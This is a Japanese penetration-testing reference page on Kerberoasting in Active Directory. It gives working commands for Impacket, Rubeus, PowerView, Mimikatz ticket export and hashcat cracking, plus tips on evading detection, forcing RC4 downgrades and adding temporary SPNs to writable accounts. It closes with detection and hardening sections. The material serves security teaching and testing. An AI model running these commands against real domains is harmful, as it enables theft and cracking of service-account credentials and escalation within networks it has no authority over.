# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoastingでは、TGSチケットの取得に注目します。具体的には、Active Directory（AD）でコンピューターアカウントを除くユーザーアカウントとして実行されるサービスに関連するチケットが対象です。これらのチケットはユーザーパスワードに由来するキーで暗号化されているため、オフラインで認証情報をクラックできます。サービスでユーザーアカウントが使われていることは、ServicePrincipalName（SPN）プロパティが空でないことで分かります。

認証済みのドメインユーザーであれば誰でもTGSチケットを要求できるため、特別な権限は必要ありません。<sup>[[4]](#references)[[5]](#references)</sup>

### Key Points

- ユーザーアカウントで実行されるサービス（つまり、SPNが設定されたアカウント。コンピューターアカウントは対象外）のTGSチケットを狙います。
- チケットはサービスアカウントのパスワードから導出されたキーで暗号化されており、オフラインでクラックできます。
- 高い権限は不要です。認証済みのアカウントであれば誰でもTGSチケットを要求できます。

> [!WARNING]
> 多くの公開ツールは、AESよりもクラックが速いため、RC4-HMAC（etype 23）のサービステicketを優先して要求します。RC4 TGSハッシュは `$krb5tgs$23$*`、AES128は `$krb5tgs$17$*`、AES256は `$krb5tgs$18$*` で始まります。ただし、多くの環境がAESのみへ移行しています。RC4だけが関係すると決めつけないでください。
> また、「spray-and-pray」roastingは避けてください。Rubeusのデフォルトのkerberoastは、すべてのSPNを照会してチケットを要求できるため、ノイズが大きくなります。まず列挙を行い、興味深いprincipalを標的にしてください。

### Service account secrets & Kerberos crypto cost

多くのサービスは、現在も手動管理のパスワードを持つユーザーアカウントで実行されています。KDCはそれらのパスワードから導出したキーでサービステicketを暗号化し、その暗号文を認証済みの任意のprincipalに渡します。そのため、kerberoastingではロックアウトやDCのテレメトリーを発生させずに、無制限のオフライン推測が可能です。暗号化方式によってクラックに必要な計算量が異なります。

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1、4,096回の反復、およびドメインとSPNから生成されるprincipalごとのsalt | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | 約680万 guesses/s | Saltによりrainbow tableは使えませんが、短いパスワードなら依然として高速にクラックできます。 |
| RC4 + NT hash | パスワードのMD4を1回適用（saltなしのNT hash）。Kerberosではチケットごとに8バイトのconfounderを混ぜるだけです | etype 23 (`$krb5tgs$23$`) | 約**41億** guesses/s | AESより約1000倍高速です。攻撃者は `msDS-SupportedEncryptionTypes` が許可する場合、RC4を強制します。 |

*Chick3nmanのベンチマーク。引用元は [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) です。<sup>[[3]](#references)</sup>

RC4のconfounderはkeystreamをランダム化するだけで、推測ごとの計算量を増やしません。サービスアカウントでランダムなシークレット（gMSA/dMSA、マシンアカウント、またはvault管理の文字列）を使っていない限り、侵害までの速度はGPUの計算能力だけで決まります。AESのみのetypeを強制すれば、毎秒数十億回の推測が可能になるダウングレードは防げますが、弱い人間由来のパスワードは依然としてPBKDF2でも破られます。<sup>[[3]](#references)</sup>

### Attack

#### Linux

NetExecでroast可能なチケットを要求し、Hashcatでクラックする実践的なエンドツーエンドの例は、参考資料[1]にあります。<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Kerberoastのチェック機能を含む多機能ツール：

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- Kerberoast可能なユーザーを列挙する

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technique 1: TGSを要求してメモリからダンプする

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- 手法 2: 自動ツール

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> TGS request は Windows Security Event 4769（Kerberos service ticket が要求された）を生成します。

### OPSEC と AES のみの環境

- AES を使用しないアカウントには、意図的に RC4 を要求します:
  - Rubeus: `/rc4opsec` は tgtdeleg を使用して AES を使用しないアカウントを列挙し、RC4 service ticket を要求します。
  - Rubeus: kerberoast とともに `/tgtdeleg` を使用すると、可能な場合に RC4 request も発生します。<sup>[[6]](#references)</sup>
- AES のみのアカウントも、エラーなく失敗させずに Roast します:
  - Rubeus: `/aes` は AES が有効なアカウントを列挙し、AES service ticket（etype 17/18）を要求します。
  - すでに TGT（PTT または .kirbi から）を保持している場合は、`/spn:<SPN>` または `/spns:<file>` とともに `/ticket:<blob|path>` を使用して LDAP をスキップできます。
- ターゲット指定、throttling、ノイズの低減:
  - `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>`、`/jitter:<1-100>` を使用します。
  - `/pwdsetbefore:<MM-dd-yyyy>`（古い password）で脆弱な可能性の高い password をフィルタリングするか、`/ou:<DN>` で特権 OU をターゲットにします。<sup>[[8]](#references)</sup>

例（Rubeus）:

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### 永続化 / 悪用

アカウントを制御または変更できる場合、SPNを追加してkerberoastableにできます：

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

cracking を容易にするため、アカウントをダウングレードして RC4 を有効化する（対象オブジェクトへの書き込み権限が必要）:

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### ユーザーに対する GenericWrite/GenericAll を利用した Targeted Kerberoast（一時的な SPN）

BloodHound でユーザーオブジェクト（例: GenericWrite/GenericAll）を制御できることが示されている場合、そのユーザーに現在 SPN がなくても、そのユーザーを確実に「targeted-roast」できます:<sup>[[9]](#references)</sup>

- 制御下のユーザーに一時的な SPN を追加して、roastable にする。
- その SPN に対して RC4 (etype 23) で暗号化された TGS-REP を要求し、cracking しやすくする。
- `$krb5tgs$23$...` hash を hashcat で crack する。
- footprint を抑えるため、SPN を削除する。

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux のワンライナー（targetedKerberoast.py が SPN の追加 -> TGS（etype 23）の要求 -> SPN の削除を自動化）:<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

hashcat autodetectで出力をCrackする（`$krb5tgs$23$`の場合はmode 13100）:

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

検知に関する注意: SPN の追加・削除はディレクトリの変更を発生させます（対象ユーザーの Event ID 5136/4738）。また、TGS request により Event ID 4769 が生成されます。実行頻度を抑え、速やかにクリーンアップしてください。

Kerberoast attacks に役立つツールはこちらにあります: https://github.com/nidem/kerberoast

Linux で次のエラーが表示された場合: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`、ローカル時刻のずれが原因です。DC と同期してください。

- `ntpdate <DC_IP>`（一部のディストリビューションでは非推奨）
- `rdate -n <DC_IP>`

### ドメインアカウントなしでの Kerberoast（AS-requested STs）

2022 年 9 月、Charlie Clark は、プリ認証が不要なプリンシパルの場合、リクエスト本文の sname を変更して細工した KRB_AS_REQ を送信することで、TGT の代わりにサービスチケットを取得できることを示しました。これは AS-REP roasting と同様の手法で、有効なドメイン認証情報は必要ありません。

詳細: Semperis の記事「New Attack Paths: AS-requested STs」。<sup>[[10]](#references)</sup>

> [!WARNING]
> 有効な認証情報がないと、この手法では LDAP にクエリできないため、ユーザーのリストを用意する必要があります。

Linux

- Impacket（PR #1413）:

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

関連

AS-REP roastable usersを対象にしている場合は、こちらも参照してください。

{{#ref}}
asreproast.md
{{#endref}}

### 検出

Kerberoastingはステルス性を保てます。DCからのEvent ID 4769を調査し、ノイズを減らすフィルターを適用します。

- service name `krbtgt` と、`$`で終わるservice name（コンピューターアカウント）を除外します。
- machine accountからのリクエスト（`*$$@*`）を除外します。
- 成功したリクエストのみを対象にします（Failure Code `0x0`）。
- 暗号化タイプを追跡します：RC4（`0x17`）、AES128（`0x11`）、AES256（`0x12`）。`0x17`のみをアラート対象にしないでください。

PowerShellによるトリアージの例：

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

追加のアイデア:

- ホスト／ユーザーごとに通常のSPN使用状況のベースラインを設定し、単一のプリンシパルから異なるSPNへの要求が大量に発生した場合にアラートを出す。
- AESで強化されたドメインで、通常と異なるRC4の使用にフラグを立てる。

### 緩和策 / Hardening

- サービスにはgMSA/dMSAまたはマシンアカウントを使用する。管理対象アカウントは120文字以上のランダムなパスワードを持ち、自動的にローテーションされるため、オフラインクラッキングは実質的に不可能になる。<sup>[[7]](#references)</sup>
- サービスアカウントの`msDS-SupportedEncryptionTypes`をAESのみ（10進数の24 / 16進数の0x18）に設定してAESを強制し、その後パスワードをローテーションしてAESキーを導出する。<sup>[[7]](#references)</sup>
- 可能であれば、環境内でRC4を無効化し、RC4の使用試行を監視する。DCでは、`msDS-SupportedEncryptionTypes`が設定されていないアカウントのデフォルトを指定するために、`DefaultDomainSupportedEncTypes`レジストリ値を使用できる。十分にテストすること。
- ユーザーアカウントから不要なSPNを削除する。<sup>[[7]](#references)</sup>
- 管理対象アカウントを使用できない場合は、サービスアカウントに長くランダムなパスワード（25文字以上）を使用する。一般的なパスワードを禁止し、定期的に監査する。<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcatによる実践的なクラッキング](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: レガシーKerberos暗号による低技術・高影響の攻撃 (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberosを攻撃する方法](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberosの悪用: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES有効時にRC4暗号化TGSを要求する](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoastingの緩和に役立つMicrosoftのガイダンス](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoastコマンドのドキュメント](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DAへのDCSync](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – 新たな攻撃経路？ AS Requested Service Tickets (Charlie Clark、2022年9月)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
